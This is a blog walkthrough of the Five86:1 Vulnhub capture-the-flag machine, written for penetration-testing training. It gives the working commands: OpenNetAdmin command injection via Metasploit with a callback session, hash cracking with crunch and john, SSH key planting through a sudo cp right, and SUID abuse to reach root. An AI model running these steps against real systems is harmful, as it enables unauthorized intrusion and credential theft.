---
title: 'Five86:1 Vulnhub Walkthrough'
date: 2020-01-22T07:52:00+01:00
draft: false
---

Today we are sharing another CTF walkthrough of the vulnhub machine named Five86-2 with the intent of gaining experience in the world of penetration testing. The credit goes to m0tl3ycr3w and syed umar for design this machine and the level is set to beginner to advanced.

_According to the author: The ultimate goal of this challenge is to get root and to read the one and only flag._

_Linux skills and familiarity with the Linux command line are a must, as is some experience with basic penetration testing tools._

Download it from here: [https://www.vulnhub.com/entry/five86-1,417/](https://www.vulnhub.com/entry/five86-1,417/)

### **Penetration Testing Methodologies**

**Network scanning**

*   Netdiscover
*   Nmap

**Enumeration**

*   Exploring Http services

**Exploit OpenNetAdmin**

*   Command Injection (Metasploit)
*   Crack the hashes (john)

**Privilege Escalation**

*   Abusing Sudo
*   Abusing SUID

### **Walkthrough**

**Network Scanning**

As you know, this is the initial phase where we choose netdiscover for network scan for identifying host IP and this we have 192.168.0.126 as our host IP.

![](https://i0.wp.com/1.bp.blogspot.com/-0rWD70PbMag/XifoFRHDwPI/AAAAAAAAiQ0/6gQkQBIWO3g9fg_QkIwPf8ecX50R3D56wCLcBGAsYHQ/s1600/1.png?w=687&ssl=1)

In our next step, we love to use nmap for network ports enumeration, thus we run the following command and found port 80 is open for HTTP, moreover, we also found robots.txt displaying disallow entry for /ona as shown in the below image.

![](https://i1.wp.com/1.bp.blogspot.com/-Aipgwa6dyEQ/XifoGZlmVhI/AAAAAAAAiRI/77RhhoZPBGoO2eq_CawwjhiaIYaN58F9ACLcBGAsYHQ/s1600/2.png?w=687&ssl=1)

### **Enumeration**

Thus, we navigate to a web browser and browse the following URL and found open network admin application is running on the webserver and disclosing application installed version.

```
http://192.168.0.126/ona
```

![](https://i1.wp.com/1.bp.blogspot.com/-jm0S0sRdPrY/XifoGhack5I/AAAAAAAAiRM/KKT0zxnf_0McJfgzYqGI04ikW3puPfe4gCLcBGAsYHQ/s1600/3.png?w=687&ssl=1)

As we notice that the openNetAdmin 18.1.1 version is installed on the host machine, so we explored for its exploit and found ruby script for Metasploit available to [Exploit DB](exploit-db.com/exploits/47772) to abuse OpenNetAdmin against command injection. Without wasting time, we download a malicious file from our local machine.

![](https://i2.wp.com/1.bp.blogspot.com/-53KayIS9pZM/XifoHK8DoyI/AAAAAAAAiRQ/8a_WsiORircJDGnGYnj5KtOIGF4peQPgQCLcBGAsYHQ/s1600/4.png?w=687&ssl=1)

Further, we copied the download ruby inside the Metasploit framework to use the module for exploit the host machine against its vulnerability.

![](https://i1.wp.com/1.bp.blogspot.com/-nW7bCdXV50M/XifoHRb-3EI/AAAAAAAAiRU/41fEkI7fsL0mfByGe8hW6jwfDji08zZ1gCLcBGAsYHQ/s1600/5.png?w=687&ssl=1)

### **Exploit**

After copying the exploit inside Metasploit Framework, you will need to reload the database and load the module.

Here we got our meterpreter session after running the following commands:

```
use exploit 47772  
set rhosts 192.168.0.126  
set lhost 192.168.0.132  
exploit
```

![](https://i0.wp.com/1.bp.blogspot.com/-l_pTHpIb7-M/XifoHkYNGHI/AAAAAAAAiRY/C2g98EXtXfo1IgxVS48tILyKIxsHOo2DQCLcBGAsYHQ/s1600/6.png?w=687&ssl=1)

So, we successfully exploited the host machine and spawned the shell as www-data, we decided to go with post enumeration for privilege escalation and as a result, we found the “.htaccess” file from within _/var/www/html/reports_. By reading the .htaccess we found path for .htpasswd file i.e. “/var/www/.htpasswd” , and by reading .htapasswd file we found hashes for user “douglas”. In the .htapsswd file, the author has left a hint for the password as shown in the image.

![](https://i1.wp.com/1.bp.blogspot.com/-cGr9bfryi9o/XifoHx4Eg5I/AAAAAAAAiRc/2W2LWGGj-IgTeZMdkBmRcEq2wvnpnmXSwCLcBGAsYHQ/s1600/7.png?w=687&ssl=1)

So, we found that the password is a 10-character “aefhrt” string, so you’ll need to prepare a 10-character long password dictionary. Here we use crunch to create the dictionary and execute the following command to follow the pattern of the password as the author has said.

```
crunch 10 10 aefhrt > dict.txt
```

With the help of the above command, we generated a dictionary and used the john ripper to crack the hash value. Here I saved the hash value described above in a text file called “hash” and used dict.txt wordlist to crack the hash value and run the following command.

```
john --wordlist=/root/dict.txt hash
```

As a result, we found the password: “**fatherrrrr**” for the given hash value.

![](https://i0.wp.com/1.bp.blogspot.com/-jOvvMFLe5LQ/XifoIJHz3SI/AAAAAAAAiRg/gVFbpDmpM0IZX9lhg6rYSQ1eNHc8L_KuACLcBGAsYHQ/s1600/8.1.png?w=687&ssl=1)

### **Privilege Escalation**

As we spawned the host machine shell, we try to switch as Douglas by using the password cracked above. When we signed in as Douglass, we searched for the sudo rights for him and found that he could use the copy program as “jen.”

![](https://i2.wp.com/1.bp.blogspot.com/-AOiBQPOxbDg/XifoIGD4MbI/AAAAAAAAiRk/Qa98peVsKOcz9Dc84OROqnt0I7ZwzjpbACLcBGAsYHQ/s1600/8.png?w=687&ssl=1)

Since the author has given sudo right on copy program which could be executed as jen hence we can copy the ssh public rsa\_key of douglas inside /home/jen/.ssh so that we can be logged as jen. Thus, we executed the following commands as given below.

```
cat id\_rsa.pub > /tmp/authorized\_keys  
cd /tmp  
chmod 777 authorized\_keys  
sudo -u jen /bin/cp authorized\_keys /home/jen/.ssh
```

**![](https://i2.wp.com/1.bp.blogspot.com/-OfGdHQ5Dz2g/XifoFcQ-sTI/AAAAAAAAiQ4/JtziB2ztR04OmkBimb2DSLNiPveYDj5wACLcBGAsYHQ/s1600/10.png?w=687&ssl=1)**

Now copy id\_rsa in the /tmp directory and change the permission then try to access ssh shell on localhost as jen.

```
cd .ssh  
cp id\_rsa /tmp  
cd /tmp  
chmod 600 id\_rsa  
ssh -i id\_rsa jen@127.0.0.1
```

Hmmm! As we connected to the ssh shell as jen we found another hint “_you have a new mail_” on the ssh banner as shown in the given image.

![](https://i1.wp.com/1.bp.blogspot.com/-WWitVzpb2Sg/XifoFUOWI4I/AAAAAAAAiQ8/mscpEYwleGY6njMR3e8ZcS80NWOiA7rRQCLcBGAsYHQ/s1600/11.png?w=687&ssl=1)

So, we find a text file “jen” in / var/mails that shows a jen email. As per this message, jen knows the password for the Moss account, so we can use the Moss credential for a further move.

![](https://i0.wp.com/1.bp.blogspot.com/-VqkQdJfOguY/XifoF4W2pAI/AAAAAAAAiRA/RBHGajq3HzIeAr7Gi9URdwJHX15pTTJ0wCLcBGAsYHQ/s1600/12.png?w=687&ssl=1)

So, switched from Jen’s account to Moss and identified for SUID enabled directories, luckily here we found that the sticky bit is enabled for “upyourgame” as shown in the image.

```
find / -perm -u=s -type f 2>/dev/null  
cd .game  
./upyourgame
```

So we navigate to /home/Moss/.game/ and run the “upyourgame” program, the program launches questionnaires that are only answerable in the YES / NO format, and finally, we get the root shell and find the final flag in the /root directory as shown below.

![](https://i2.wp.com/1.bp.blogspot.com/-Rd-K3ytxL0U/XifoGcnBbJI/AAAAAAAAiRE/jTPLI1La4uUz-bZV_khGZjJp-PuGFKgrQCLcBGAsYHQ/s1600/13.png?w=687&ssl=1)

**Author: **Shubham Sharma is a Pentester, Cybersecurity Researcher and Enthusiast, contact [**here**](https://www.linkedin.com/in/shubham-sharma-626964153/).

The post [Five86:1 Vulnhub Walkthrough](https://www.hackingarticles.in/five861-vulnhub-walkthrough/) appeared first on [Hacking Articles](https://www.hackingarticles.in).

  
  
from Hacking Articles https://ift.tt/2NJ44ED